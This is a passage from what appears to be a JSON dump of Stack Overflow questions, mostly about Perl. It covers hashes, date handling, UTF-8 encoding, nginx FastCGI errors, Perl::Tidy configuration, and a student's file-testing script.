order as long as hash is not modified.</p>\n"},{"tags":["perl","epoch","localtime"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":117,"score":2,"question_id":12769110,"title":"Perl epoch time before 1970 formating","body":"<p>I have problem formating and dealing with dates before the epoch 1/1/1970 in Perl, dates comes back as negative integer:</p>\n\n<pre><code>my $time=timelocal(0, 0, 0, 1, 1, 1969);\nprint \"$time\\n\"; \n$theTime = localtime($time); \nprint \"the time is good: $theTime\\n\\n\";\n</code></pre>\n\n<p>can you please tell me how to deal with dates before the epoch in Perl, both on unix and windows have the same problem Perl 5.8.8. PHP shows the date normal without problems.</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":75,"score":2,"question_id":12769347,"title":"Is there a way for Perl to report on the exact line number for Error","body":"<p>Here is the code that will produce error:</p>\n\n<pre><code>#!/usr/bin/env perl\nuse strict\nuse warnings FATAL=&gt;'all';\n\nuse ExtUtils::Installed;\n\nmy $instmod = ExtUtils::Installed-&gt;new();\n\nforeach my $module ($instmod-&gt;modules())\n{\n    my $version = $instmod-&gt;version($module) || \"???\";\n    print \"$module -- $version\\n\";\n    }\n</code></pre>\n\n<p>Just dont use \";\" in use strict</p>\n\n<p>error:</p>\n\n<pre><code>syntax error at ListModules.pl line 3, near \"use strict\nuse warnings \"\nExecution of ListModules.pl aborted due to compilation errors.\n</code></pre>\n\n<p>Perl Version info:</p>\n\n<pre><code>This is perl 5, version 12, subversion 4 (v5.12.4) built for x86_64-linux-gnu-thread-multi\n</code></pre>\n"},{"tags":["perl","unicode","string-length"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12771446,"title":"Unicode::GCString and UTF8 flag","body":"<p>Does this have by design this way that <a href=\"http://search.cpan.org/perldoc?Unicode%3A%3AGCString\" rel=\"nofollow\">Unicode::GCString</a> assigns meaning to the UTF8 flag (<a href=\"http://stackoverflow.com/questions/9390884/unicodegcstring-error-message-new-unicode-string-must-be-given\">accepted answer</a>) or could this change in a future release?</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":100,"score":-1,"question_id":12769075,"title":"Perl Database script from table","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/12756971/from-database-in-perl-to-spreadsheet\">From Database in Perl to spreadsheet</a>  </p>\n</blockquote>\n\n\n\n<p>I have a transaction table like this:</p>\n\n<pre><code>TranID  Date        AccNum   Type    Amount ChequeNo DDNo  \n657520  02-07-1999  0181432  Debit   16000  465774     \n657524  02-07-1999  0181432  Debit   13000           569086\n657538  09-07-1999  0181432  Credit  11000  \n657548  18-07-1999  0181432  Credit  15500  \n657519  02-07-1999  0181432  Debit   12000  \n657523  02-07-1999  0181432  Credit  11000  \n657529  03-07-1999  0181433  Debit   15000  466777\n657539  10-07-1999  0181433  Credit  10000  \n657541  11-07-1999  0181433  Debit   12000  \n657525  03-07-1999  0181433  Debit   15000           569999\n657533  05-07-1999  0181433  Credit  12500  \n</code></pre>\n\n<p>My question is:\nQuery the data from transaction table and calculate the total amount debited by cheque, dd and cash for each account.\nMy code is like this:</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\nuse DBI; \n\nprint \"content-type:text/html\\n\\n\";\n\nmy $dbh = DBI-&gt;connect('dbi:mysql:database:3306','prithvi','prithvi') \n    or die \"Couldn't connect\";\n\nmy $tran_cur = $dbh-&gt;prepare(\"SQL Query\");\n$tran_cur-&gt;execute;\n\nmap { print \"&lt;td&gt;$_&lt;/td&gt;\" } qw(AccountNumber-ChequeDebit-DDDebit-CashDebit);\nprint \"&lt;br/&gt;\";\n\nwhile (my @data = $tran_cur-&gt;fetchrow_array()) {\n\n    my $rec = join '-', @data;\n    print \"$rec&lt;br/&gt;\";\n}\n$tran_cur-&gt;finish;\n$dbh-&gt;disconnect;\n</code></pre>\n\n<p>Can anyone please tell me how to solve this using Single SQL query:\nI want the output as:</p>\n\n<pre><code>AccountNumber-ChequeDebit-DDDebit-CashDebit\n0181432-16000-13000-12000\n0181433-15000-15000-12000\n</code></pre>\n\n<p>Thanks in advance. Please help.</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":85,"score":0,"question_id":12766411,"title":"How can one print values of nested hashes in Perl?","body":"<pre><code>$dict{'one'}=1;\nprint %dict;\n</code></pre>\n\n<p>This will print </p>\n\n<blockquote>\n  <p>one1</p>\n</blockquote>\n\n<p>to the terminal. But what if my code has a <s>dictionary</s> hash in a <s>dictionary</s> hash like this:</p>\n\n<pre><code>my %dict;\n$dict{'1'}{'1'}=2;\n\nprint %dict;\n</code></pre>\n\n<p>This gives the output:</p>\n\n<pre><code>1HASH(0xb1db78)\n</code></pre>\n\n<p>Even when I change the last line to </p>\n\n<pre><code>print $dict{'1'};\n</code></pre>\n\n<p>The output is:</p>\n\n<blockquote>\n  <p>HASH(0x13ccb78)</p>\n</blockquote>\n\n<p>How can I get the contents of the <s>dictionary</s> hash instead of the reference location?</p>\n"},{"tags":["perl","error-handling","nginx","fcgi","spawn-fcgi"],"answer_count":1,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":386,"score":4,"question_id":9941322,"title":"How to get perl script errors in nginx error log (Nginx with FCGIwrap)","body":"<p>I just installed fcgiwrap and spawn-fcgi to be able to use perl scripts in nginx. I added something like this in my site config:</p>\n\n<pre><code>location ~ \\.pl$ {\n    gzip off;\n    fastcgi_pass unix:/var/run/fcgiwrap.socket;\n    include fastcgi_params;\n    fastcgi_index index.pl;\n}\n</code></pre>\n\n<p>It works but browser shows the following message if there is an error in perl code:</p>\n\n<pre><code>An error occurred while reading CGI reply (no response received)\n</code></pre>\n\n<p>And I am not able to find perl errors in the nginx logs. \"perl -c\" on the command line helps if there are perl compilation errors but it does not help me solve runtime errors.</p>\n\n<p>How can I tell perl or fcgiwrap to save errors in nginx error log or some other log file?</p>\n"},{"tags":["xml","perl","utf-8","cgi"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":78,"score":1,"question_id":12768681,"title":"Perl cgi and XML::Code double encoding issue","body":"<p>I am using XML::Code to create some XML Data from a GET parameter received through the CGI module. The webserver is Apache with charset set to UTF-8 and the submitting form is on a page with a</p>\n\n<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en-GB\"&gt;\n&lt;head&gt;\n&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"&gt;\n</code></pre>\n\n<p>header. The CGI looks like this:</p>\n\n<pre><code>use CGI;\nuse Encode;\nuse XML::Code;\nbinmode(STDOUT, \":utf8\");\nbinmode(STDIN, \":utf8\");\n\nmy $cgi = CGI-&gt;new();\nprint $cgi-&gt;header(-type =&gt; \"text/xml\", -charset =&gt; \"utf-8\");\nmy $object = $cgi-&gt;param(\"object\");\n$object = decode(\"utf-8\", utf8::upgrade($object));\n\nmy $content = XML::Code-&gt;new(\"formdata\");\n$content-&gt;version (\"1.0\");\n$content-&gt;encoding (\"UTF-8\");\n\nmy $sub_content = XML::Code-&gt;new(\"object\");\n$sub_content-&gt;set_text($object);\n$content-&gt;add_child($sub_content);\n\n$sub_content = XML::Code-&gt;new(\"isutf\");\n$sub_content-&gt;set_text(utf8::is_utf8($object));\n$content-&gt;add_child($sub_content);\n\nprint $content-&gt;code();\n</code></pre>\n\n<p>When calling the cgi with <a href=\"http://mydomain.com/cgi-bin/formdata.pl?object\" rel=\"nofollow\">http://mydomain.com/cgi-bin/formdata.pl?object</a>=Ã¶ the output (as copied from firebug) is</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;formdata&gt;\n    &lt;object&gt;ÃÂ¶&lt;/object&gt;\n    &lt;isutf&gt;1&lt;/isutf&gt;\n&lt;/formdata&gt;\n</code></pre>\n\n<p>Removing binmode(STDOUT, \":utf8\") from the CGI gives me what I am looking for</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;formdata&gt;\n    &lt;object&gt;Ã¶&lt;/object&gt;\n    &lt;isutf&gt;1&lt;/isutf&gt;\n&lt;/formdata&gt;\n</code></pre>\n\n<p>Now I know how to solve this issue, but I thought I would be safe when setting everything to UTF-8. If I am not it would mean a lot more testing. Is it a bug in the perl libraries or in my thinking?</p>\n\n<p>Best,\nMarcus</p>\n"},{"tags":["perl","fastcgi","otrs"],"answer_count":1,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":201,"score":4,"question_id":12106224,"title":"CGI reply error on nginx server using fcgiwrap","body":"<p>I have a <strong>nginx server running on debian wheezy</strong>. I have working <strong>OTRS</strong> installation. But our old <strong>perl-fcgi wrapper</strong> was interferring with some other important process so we desided to choose <strong>fcgiwrap package</strong>: <a href=\"http://www.haschmi.de/de/otrs/otrs-on-nginx.html\" rel=\"nofollow\">http://www.haschmi.de/de/otrs/otrs-on-nginx.html</a></p>\n\n<p>So I removed the old wrapper and installed the new one. The old wrapper had</p>\n\n<pre><code>fastcgi_pass 127.0.0.1:8999;\n</code></pre>\n\n<p>and the new one </p>\n\n<pre><code>fastcgi_pass unix:/var/run/fcgiwrap.socket;\n</code></pre>\n\n<p>Here is the complete config</p>\n\n<pre><code>server {\n   listen ip:80;\n\n    server_name support.test.com;\n\n    root /opt/otrs/var/httpd/htdocs;\n\n    index index.html;\n    location /otrs-web {\n        gzip on;\n        alias /opt/otrs/var/httpd/htdocs;\n    }\n\n   location ~ ^/otrs/(.*\\.pl)(/.*)?$ {\n   #try_files $uri =404;\n    gzip off;\n    fastcgi_pass unix:/var/run/fcgiwrap.socket;\n    fastcgi_index index.pl;\n    fastcgi_param SCRIPT_FILENAME /opt/otrs/bin/fcgi-bin/$1;\n\n\n    fastcgi_param QUERY_STRING $query_string;\n    fastcgi_param REQUEST_METHOD $request_method;\n    fastcgi_param CONTENT_TYPE $content_type;\n    fastcgi_param CONTENT_LENGTH $content_length;\n    fastcgi_param GATEWAY_INTERFACE CGI/1.1;\n    fastcgi_param SERVER_SOFTWARE nginx;\n    fastcgi_param SCRIPT_NAME $fastcgi_script_name;\n    fastcgi_param REQUEST_URI $request_uri;\n    fastcgi_param DOCUMENT_URI $document_uri;\n    fastcgi_param DOCUMENT_ROOT $document_root;\n    fastcgi_param SERVER_PROTOCOL $server_protocol;\n    fastcgi_param REMOTE_ADDR $remote_addr;\n    fastcgi_param REMOTE_PORT $remote_port;\n    fastcgi_param SERVER_ADDR $server_addr;\n    fastcgi_param SERVER_PORT $server_port;\n    fastcgi_param SERVER_NAME $server_name;\n   }\n}\n</code></pre>\n\n<p>When I visit our OTRS everything works. But as son as I submit the login form I get </p>\n\n<pre><code>An error occurred while reading CGI reply (no response received)\n</code></pre>\n\n<p>Any ideas what is wrong? How can I solve this?</p>\n"},{"tags":["perl","perl-tidy"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":53,"score":1,"question_id":12768797,"title":"How to remove leading comment whitespace in Perl::Tidy?","body":"<p>I'm just configuring Perl::Tidy to match my preference. I have only one issue left which I can't find a fix.</p>\n\n<p>Sample script:</p>\n\n<pre><code>#!/usr/bin/perl\n#   |   |   |   |   |   &lt; \"|\" indicates first five \"tabs\" (1 tab 4 spaces).\nuse strict;     # Enable strict programming mode.\nuse warnings;   # Enable Perl warnings.\nuse utf8;       # This is an UTF-8 encoded script.\n1;\n</code></pre>\n\n<p>perltidyrc:</p>\n\n<pre><code># Perl Best Practices (plus errata) .perltidyrc file\n\n-l=76   # Max line width is 76 cols\n-i=4    # Indent level is 4 cols\n-ci=4   # Continuation indent is 4 cols\n-et=4   # 1 tab represent 4 cols\n-st     # Output to STDOUT\n-se     # Errors to STDERR\n-vt=2   # Maximal vertical tightness\n-cti=0  # No extra indentation for closing brackets\n-pt=0   # Medium parenthesis tightness\n-bt=1   # Medium brace tightness\n-sbt=1  # Medium square bracket tightness\n-bbt=1  # Medium block brace tightness\n-nsfs   # No space before semicolons\n-nolq   # Don't outdent long quoted strings\n-wbb=\"% + - * / x != == &gt;= &lt;= =~ &lt; &gt; | &amp; **= += *= &amp;= &lt;&lt;= &amp;&amp;= -= /= |= &gt;&gt;= ||= .= %= ^= x=\"\n        # Break before all operators\n\n# extras/overrides/deviations from PBP\n\n#--maximum-line-length=100               # be slightly more generous\n--warning-output                        # Show warnings\n--maximum-consecutive-blank-lines=2     # default is 1\n--nohanging-side-comments               # troublesome for commented out code\n\n-isbc   # block comments may only be indented if they have some space characters before the #\n\n# for the up-tight folk :)\n-pt=2   # High parenthesis tightness\n-bt=2   # High brace tightness\n-sbt=2  # High square bracket tightness\n</code></pre>\n\n<p>Result:</p>\n\n<pre><code>#!/usr/bin/perl\n#   |   |   |   |   |   &lt; \"|\" indicates first five \"tabs\" (1 tab 4 spaces).\nuse strict;      # Enable strict programming mode.\nuse warnings;    # Enable Perl warnings.\nuse utf8;        # This is an UTF-8 encoded script.\n1;\n</code></pre>\n\n<p>As you can see there is a leading space which causes that the \"#\" doesn't match the forth tab.</p>\n\n<p>How to remove this leading space?</p>\n"},{"tags":["python","performance","perl"],"answer_count":9,"favorite_count":2,"up_vote_count":12,"down_vote_count":2,"view_count":1332,"score":10,"question_id":1984871,"title":"Why is my Python version slower than my Perl version?","body":"<p>I've been a Perl guy for over 10 years but a friend convinced me to try Python and told me how much faster it is than Perl. So just for kicks I ported an app I wrote in Perl to Python and found that it runs about 3x slower. Initially my friend told me that I must have done it wrong, so I rewrote and refactored until I could rewrite and refactor no more and ... it's still a lot slower. So I did a simple test:</p>\n\n<pre><code>i = 0\nj = 0\n\nwhile (i &lt; 100000000):\n    i = i + 1\n    j = j + 1\n\nprint j\n</code></pre>\n\n<p>$ time python python.py<br>\n100000000</p>\n\n<p>real    0m48.100s<br>\nuser    0m45.633s<br>\nsys 0m0.043s</p>\n\n<pre><code>my $i = 0;\nmy $j = 0;\n\nwhile ($i &lt; 100000000) {\n    ++$i; # also tested $i = $i + 1 to be fair, same result\n    ++$j;\n}\n\nprint $j;\n</code></pre>\n\n<p>$ time perl perl.pl<br>\n100000000</p>\n\n<p>real    0m24.757s<br>\nuser    0m22.341s<br>\nsys 0m0.029s</p>\n\n<p>Just under twice as slow, which doesn't seem to reflect any of the benchmarks I've seen ... is this a problem with my installation or is Python really that much slower than Perl?</p>\n"},{"tags":["perl","cookies"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":34,"score":-2,"question_id":12768457,"title":"authorization through cookie","body":"<p>I need to write an authorization through cookie on the site.\nI have 3 cookies:</p>\n\n<pre><code>login=box;\nhash=5836f67d6c2669e76f35312b406ce419;\ns_session=ea934e2129daa66ec50df8c0637dbf26;\n</code></pre>\n\n<p>How to write a code, which will use this cookies?</p>\n"},{"tags":["perl","perl-data-structures","perl-hash"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":84,"score":1,"question_id":12760561,"title":"How to process an array through hash?","body":"<p>I have the following declarations:</p>\n\n<pre><code>$xx=\"xx\";\n$yy=\"yy\";\n@zone_Nw_Ip_Val = ($xx,$yy);\n%zone_Nw_Ip;\n$zone_Nw_Ip{\"eq\"}        =[@zone_Nw_Ip_Val];\n$zone_Nw_Ip{\"neq\"}       =[@zone_Nw_Ip_Val];\n$zone_Nw_Ip{\"member-of\"} =[@zone_Nw_Ip_Val];\n%zone_Nw;\n$zone_Nw{\"zone_Nw_Ip\"}   = {%zone_Nw_Ip}; \n%zone_hash;\n$zone_hash{\"Nw\"}         = {%zone_Nw};\n</code></pre>\n\n<p>I am trying to access final values of scalar variable using following structure:</p>\n\n<pre><code>foreach  $attribute_type (sort keys %zone_hash) {\n    foreach  $attribute (sort keys %{$zone_hash{$attribute_type}}) {\n        foreach $operator_type ( sort keys %{$zone_hash{$attribute_type}{$attribute}}) {\n            foreach  $value ( @{$zone_hash{$attribute_type}{$attribute}{$operator_type}}) {\n                print \"\\n attribute_type --&gt; $attribute_type  attribute--&gt; $attribute operator_type --&gt; $operator_type   \";\n            }\n        }\n    }   \n}\n</code></pre>\n\n<p>but I am getting an error </p>\n\n<blockquote>\n  <p>Not an ARRAY reference</p>\n</blockquote>\n\n<p>for line</p>\n\n<pre><code>foreach  $value ( @{$zone_hash{$attribute_type}{$attribute}{$operator_type}})\n</code></pre>\n\n<p>What is wrong here ?</p>\n"},{"tags":["perl","hash"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":70,"score":2,"question_id":12762340,"title":"Copy a hash out of a hash reference","body":"<p>I have a hash reference to a hash of hashes.</p>\n\n<p>ref -> hash1<br>\n       hash2<br>\n       etc...  </p>\n\n<p>I am trying to copy 2 hashes to use to compare against each other. </p>\n\n<pre><code>   my %hash1 = %$ref-&gt;{ $name1}; // but I can't get it to work.  \n   my %hash2 = %$ref-&gt;{ $name2};\n</code></pre>\n\n<p>I get:  Reference found where even-sized list expected at.  </p>\n\n<p>I know I am not declaring this right, so any help would be appreciated.   </p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":84,"score":1,"question_id":12764715,"title":"In Perl, how to use plus operator for arithmetic calculation in print statement?","body":"<p>I have the following small Perl (v5.10) program:</p>\n\n<pre><code>use strict;\n\nmy @nums;\nmy $i = 0;\n\nwhile ($i &lt; 5) {\n\n    print \"Enter number \" . $i+1 . \": \";\n    $nums[$i] = &lt;STDIN&gt;;\n    $i++;\n}\n\nforeach (@nums) {\n\n    chomp $_;\n    print \"$_\\t\";\n}\nprint \"\\n\";\n</code></pre>\n\n<p>This is the result of a test run:</p>\n\n<pre><code>1: 2\n1: 1\n1: 6\n1: 3\n1: 2\n2   1   6   3   2   \n</code></pre>\n\n<p>The problem, as you can see, is that the print statement prompting the user for input isn't functioning as expected. Instead of \"Enter number 1: \" or \"Enter number 3:\", e.t.c., I just get \"1:\". I didn't expect this to work to be honest because I know that the + operator has been overloaded for string concatenation in Perl. How do I get around this problem? And what is the reason for it?</p>\n"},{"tags":["perl","sftp","in-memory"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":68,"score":1,"question_id":12755323,"title":"Use in-memory file as argument in SFTP","body":"<p>I need to open an SFTP connection in Perl and I need to use a dsa key file but I can't actually store the file on the hard disk for security reasons. I am trying to use Net::SFTP.</p>\n\n<pre><code>my $sftp = Net::SFTP-&gt;new(  \n    $host, user=&gt;\"$userid\",\n    ssh_args =&gt; {\n        identity_files =&gt; [ $pathToInMemoryKeyFile ]\n    }\n);\n</code></pre>\n\n<p>I think I know how to get a string represented as an in memory file handle but I don't know how to get the path of that file handle such that I can pass it in as one of the ssh_args. Does anybody have any suggestions?</p>\n\n<p>Thanks!</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12766040,"title":"Why doesn't my dictionary display its keys in Perl?","body":"<pre><code>my %dd;\n$dd[\"foo\"]=\"bar\";\nprint keys %dd;\nprint %dd;\n</code></pre>\n\n<p>This is my code. This should display the keys of the dictionary <code>%dd</code> and the dictionary itself in the last two lines right? But it isn't! I've been breaking my head behind this since a couple of hours now but nothing helps.</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":65,"score":-1,"question_id":12765509,"title":"What does the cat command in quotes in a string in perl do?","body":"<pre><code>#tf.pl\n#!/usr/local/bin/perl\nuse Util;\n$file = shift;\n$text = `cat $file`;\nmy @words = split_words ($text);\nmy @words = lc_words (@words);\nmy %count = count_hash(@words);\nwhile (my ($w, $c) = each %count) {\n    print \"$w\\t$c\\n\";\n    $df{$w} = 1;\n}\n</code></pre>\n\n<p>I came across that code on a website. On line 3 $file is given the name of the file that would have been supplied with the command line argument (correct me if I am wrong, I'm a Perl rookie)</p>\n\n<p>On line 4 you see:</p>\n\n<pre><code>$text = `cat $file`;\n</code></pre>\n\n<p>I want to know what does this line do exactly? I know <code>cat filename</code> in shows you the content of the files in the terminal (again, correct me if wrong. Linux rookie too)</p>\n\n<p>I asked this on IRC and someone said this was a bad way of doing something but I really want to know what this does more than knowing the better alternative of it</p>\n"},{"tags":["perl","system-calls"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":78,"score":0,"question_id":12764193,"title":"Perl automated file testing","body":"<p>So I'm taking a Perl programming class and our teacher gave us our first assignment with very little talk about how to actually program perl. Here's exactly what our teacher assigned:</p>\n\n<p>\"You should write a script (you may name you script whatever you deem appropriate) that accepts 3 filenames as arguments.  The first filename corresponds to the program source code written in C++.  The second filename corresponds to an input file that is to be used by the C++ program listed as the first filename.  The third filename corresponds to a text file that contains the expected, correct output for the program in question.  A directory path may be provided with any of the filenames.</p>\n\n<p>If the program doesnât require an input file, the second parameter on the command line should be the filename \"/dev/null\".</p>\n\n<p>All of the files - the program source, the input file, and expected output file - should be copied to a scratch test directory before any of them are used by the script so that there is little chance that the originals will be modified by the test procedure.  If the scratch directory doesnât exist, your script should create one as a subdirectory of the current working directory.</p>\n\n<p>Your script should then compile and link the scratch copy of the source using the GNU g++ compiler.  The script should then run the program â saving the output to a temporary file stored in the scratch test directory.</p>\n\n<p>After running the program, your script should then use the UNIX command diff to compare the actual output generated in the previous step with the expected output file and report either that the output conforms to specifications or report any differences as reported by the diff program.</p>\n\n<p>After completion, your script should remove all of the temporary copies and scratch files.  Do not remove the original program, the original input file, the original expected output file, or the scratch directory itself.\"</p>\n\n<p>I have this so far:</p>\n\n<pre><code>#!/usr/bin/perl -w\n\nuse strict;\n\nmy ($line, $program, $input, $output);\n\nprint \"Give the program, input, and standart output for testing. \";\n\n$line = &lt;&gt;;\nchomp $line;\n\n($program, $input, $output) = split/\\s+/, $line; # split/\\s+/ is to separate spaces from the input\n\nmy($o_test) = $output + \"_test\";\n\nprint \"$program \";\nprint \"$input \";\nprint \"$output \";\n\nsystem(\"mkdir test_scratch\") == 0\nor die \"failed to create test_scratch. exiting....\"\n\nsystem(\"cp $program, /test_scratch/\"); # error\nsystem(\"cp $input, /test_scratch/\");\nsystem(\"cp $output, /test_scratch/\");\n\nsystem(\"cd test_scratch\");\n\nsystem(\"g++ $program\");\nsystem(\"chmod +x a.out\");\n\nsystem(\"./a.out &lt; $input &gt; $o_test\");\n\nmy($DIFF) = system(\"diff $output $o_test\") # error\n\nif[ $DIFF != \"\"]\n    print (\"Output conforms to specifications.\"); # error\nthen\n    print (\"$DIFF\");\nsystem(\"cd ..\");\n</code></pre>\n\n<p>I'm getting errors at the # in code. I don't even know how to do the \"/dev/null\". I've spent a lot of time looking things up online and searching stackoverflow, but I just don't know what else to do. I realize this is an extremely long question but I don't know what else to do. Thank you for ANY help you can give me.</p>\n"},{"tags":["perl","roc"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12763704,"title":"ROC Curve using a Perl Module?","body":"<p>Is there a Perl Module which is capable of plotting ROC curves please? I know one exists for <a href=\"http://rocr.bioinf.mpi-sb.mpg.de/\" rel=\"nofollow\">the R programming language</a>, but I can't find one for Perl. Any ideas please?</p>\n"},{"tags":["perl","email","smtp","sendmail","bugzilla"],"answer_count":0,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":77,"score":3,"question_id":12751993,"title":"error while sending mail through gmail in bugzilla","body":"<p>I have installed bugzilla and setup mail to use gmail. I followed the instructions in <a href=\"http://dawood.in/bugzilla-alerts-using-gmail/\" rel=\"nofollow\">http://dawood.in/bugzilla-alerts-using-gmail/</a> and getting the following error when I try to create a new account. It is not able to send the email confirmation.</p>\n\n<pre><code>Bugzilla has suffered an internal error. Please save this page and send it to xyz@gmail.com with details of what you were doing at the time this message appeared.\n\nURL: http://ec2-23-22-145-251.compute-1.amazonaws.com/bugzilla/createaccount.cgi?login=xyz.user%40gmail.com&amp;token=1349461021-3be9dcb70280aadba9894f0efd09ddce\n\nThere was an error sending mail from 'adminxyz@gmail.com' to 'xyz.user@gmail.com': Could't set FROM: 530 5.5.1 Authentication Required. Learn more at at /usr/local/share/perl/5.14.2/Email/Send/SMTP/TLS.pm line 49\nTraceback:\n\n at Bugzilla/Mailer.pm line 194\n     Bugzilla::Mailer::MessageToMTA(...) called at Bugzilla/Token.pm line 91\n     Bugzilla::Token::issue_new_user_account_token(...) called at Bugzilla/User.pm line 2013\n      Bugzilla::User::check_and_send_account_creation_confirmation(...) called at /var/www/bugzilla/createaccount.cgi line 55\n</code></pre>\n\n<p>I have the bugzilla at <a href=\"http://ec2-23-22-145-251.compute-1.amazonaws.com/bugzilla\" rel=\"nofollow\">http://ec2-23-22-145-251.compute-1.amazonaws.com/bugzilla</a>\nI get this error when I enter my new email address to create a normal account at which point it tries to send an email.</p>\n"},{"tags":["mysql","perl","excel","special-characters"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":80,"score":0,"question_id":12757526,"title":"Handling Special character while importing Excel to MySQL using perl","body":"<p>I have a excel file with special characters like Ã©, non-breaking spaces, and bullets(â¢).<br>\nHow to handle these type of special characters while importing from excel to MySQL database using perl module Spreadsheet::ParseExcel?\nAlso i want to know default character set i have select for the creating the target table in the MySQL database.</p>\n"},{"tags":["perl","max"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":12754836,"title":"perl find max and record which one is it","body":"<p>If i have three variables with integer and want to find which one is the largest one(not only the max integer), e.g if a is 3, b is 4 and c is 5, the I want to know c is the largest rather than return a 5 to me. How to achieve this or I should use</p>\n\n<pre><code>use List::Util\n\n$d = max($a,$b,$c);\nif($d == $a){}\nelsif($d == $b){}\nelse{}\n</code></pre>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":77,"score":0,"question_id":12759480,"title":"Why is my Perl code not omitting newlines?","body":"<p>I'm reading this textfile to get ONLY the words in it and ignore all kind of whitespaces:</p>\n\n<pre><code>hello\nnow\n    do you see this.sadslkd.das,msdlsa but \n      i   hoohoh\n</code></pre>\n\n<p>And this is my Perl code:</p>\n\n<pre><code>#!usr/bin/perl -w\nrequire 5.004;\n\nopen F1, './text.txt';\n\nwhile ($line = &lt;F1&gt;) {\n\n    #print $line;\n    @arr = split /\\s+/, $line;\n    foreach $w (@arr) {\n\n        if ($w !~ /^\\s+$/) {\n\n            print $w.\"\\n\";\n        }\n    }\n    #print @arr;\n}\nclose F1;\n</code></pre>\n\n<p>And this is the output:</p>\n\n<pre><code>hello\nnow\n\ndo\nyou\nsee\nthis.sadslkd.das,msdlsa\nbut\n\ni\nhoohoh\n</code></pre>\n\n<p>The output is showing two newlines but I am expecting the output to be just words. What should I do to just get words?</p>\n"},{"tags":["regex","perl","tree"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":83,"score":2,"question_id":12755369,"title":"How to traverse a textual recursive structure in Perl?","body":"<p>I wonder what methods are in Perl for traversing a recursive structure (e.g. binary tree)\nwhich is given as a string.</p>\n\n<p>more concretely:</p>\n\n<p>Here is a tree, for simplicity is is parse tree and very short.\nimagine it is string without fancy tabbing and spaces.</p>\n\n<pre><code>tree(Sentence, \n  tree(NounPhrase,\n    leaf(Determiner, \"a\"),\n    leaf(Noun, \"man\", \"singular\")\n  ), \n  tree(VerbPhrase,\n    leaf(Verb, \"walks\", \"present\", \"3rd person\")\n  )\n)\n</code></pre>\n\n<p>Now I want to access two direct child nodes of the root,\nbut I cannot do this with regular expressions simply.</p>\n\n<pre><code>m/tree \\( \\w+ , (group1) , (group2) \\) /x\n</code></pre>\n\n<p>I would like to capture group1 and group2 correctly,\ni.e. group1 and group2 having even number of opening and closing parentheses.</p>\n\n<p><strong>It seems quite complicated task and wonder what is the common/simplest solution to it?</strong> </p>\n\n<p>For example, prolog will easily digest this task.</p>\n"},{"tags":["regex","perl","pdl"],"answer_count":6,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":107,"score":0,"question_id":12357210,"title":"cryptic perl expression","body":"<p>I find the following statement in a perl (actually PDL) program:</p>\n\n<pre><code>/\\/([\\w]+)$/i;\n</code></pre>\n\n<p>Can someone decode this for me, an apprentice in perl programming?</p>\n"},{"tags":["python","perl","r","unix","bioconductor"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":10,"view_count":145,"score":-10,"question_id":12754724,"title":"Random sampling a list of genes","body":"<p>I would like to create 1000 random lists of 1652 genes from a universe of 19.000 genes. I decided to replace since the universe is not so big. The only condition is that lists can contain similar genes between them (due to replacement) but each list can not contain a gene more than one time. So it will be unique in the single list.\nAny suggestion about this?</p>\n\n<p>Ex: Universe = letters[1:26]</p>\n\n<p>Desired output:</p>\n\n<blockquote>\n<pre><code> [[1]]  [[2]]   [[3]]   [[...]]\n   a      b       f\n   b      c       a\n   c      d       b\n   f      z       j\n   h      j       o\n</code></pre>\n</blockquote>\n\n<p>I would like avoid a situation like:</p>\n\n<blockquote>\n<pre><code> [[1]]  [[...]]\n  a   \n  a   \n  b   \n  c\n  c\n</code></pre>\n</blockquote>\n\n<p>Since the universe is not so big I cannot set REPLACE = F.  If I set REPLACE = T, replicated elements occur in the list...this is what I'm trying to avoid for my analysis.</p>\n\n<p>Thanks in 